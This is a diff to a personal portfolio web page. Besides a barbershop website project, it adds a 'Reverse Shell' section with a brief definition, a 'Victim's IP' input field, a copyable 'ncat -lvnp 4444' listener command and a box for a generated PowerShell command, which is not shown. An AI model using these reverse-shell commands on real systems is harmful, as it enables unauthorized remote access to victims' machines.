@@ -115,7 +115,28 @@
             <h2>Freelancing Barbershop websites</h2>
             <p>The Internet has come of age and everything is online. My hairdresser, who always does a perfect job, did not have a website to book a haircut.</p>
             <p>We worked together to create a functional <a class="hover-underline-animation" href="https://vkk.mhr.mybluehost.me/website_91454de2" style="color:rgb(202, 191, 248);" class="hover-underline-animation">Website</a> showing his location, prices and a booking function.</p>
-        </section>
+        
+        </section> 
+    <section>
+        <h2>Reverse Shell</h2>
+        <p>Reverse Shells are the act of redirecting the input and output of a shell to a service so that it can be remotely accessed, a remote shell.</p>
+        <p>This section is intended to provide a brief overview of this topic:</p>
+        <div class="read-more-content hidden">
+            <div class="input-group">
+                <label for="victim-ip">Enter Victim's IP Address:</label>
+                <input type="text" id="victim-ip" placeholder="e.g., 192.168.1.10" oninput="generatePowerShellCommand()">
+            </div>
+            <div class="code-box">
+                ncat -lvnp 4444
+                <button class="copy-btn" onclick="copyToClipboard('ncat -lvnp 4444')">Copy</button>
+            </div>
+            <div class="code-box" id="powershell-command">
+                <!-- PowerShell command will be generated here -->
+                <button class="copy-btn" onclick="copyPowerShellCommand()">Copy</button>
+            </div>
+        </div>    
+        <button class="read-more-btn collapsed hover-underline-animation" onclick="toggleReadMore(this)">Read More</button>
+    </section>        
     </div>
     <br>
     <br>
